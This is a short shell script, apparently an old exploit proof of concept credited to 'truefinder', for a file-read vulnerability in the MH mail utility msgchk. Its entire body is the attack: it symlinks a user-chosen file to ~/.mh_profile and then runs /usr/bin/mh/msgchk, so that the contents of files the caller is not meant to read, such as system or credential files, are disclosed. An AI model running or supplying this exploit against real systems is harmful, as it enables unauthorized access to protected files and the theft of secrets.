++ msgchkx.sh
#!/bin/sh
# truefinder, seo@igrus.inha.ac.kr
# msgchk file read vulnerability

if [ ! -f $1 ]
then
	echo "usage : $0 <file path>"
fi

cd ~
ln -sf $1 ~/.mh_profile
/usr/bin/mh/msgchk

